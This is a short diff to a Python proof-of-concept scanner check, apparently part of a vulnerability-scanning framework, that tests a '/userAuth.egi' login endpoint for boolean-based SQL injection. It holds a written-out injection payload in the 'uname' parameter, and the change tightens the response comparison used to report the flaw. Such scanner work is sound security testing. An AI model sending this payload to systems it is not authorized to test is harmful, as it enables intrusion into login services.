@@ -33,7 +33,8 @@ class Poc(ABPoc):
             url1 = self.target + "/userAuth.egi?uname=admin' AND 3276=3276 AND 'HmLC' ='HmLC&upwd=12345"
             _response = requests.get(url)
             _response1 = requests.get(url1)
-            if _response.text != _response1.text:
+            
+            if _response.text != _response1.text and (url == _response.url or url1 == _response1.url) and (_response.status_code == 200 or _response1.status_code == 200):
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
         except Exception, e:
             self.output.info('执行异常：{}'.format(e))
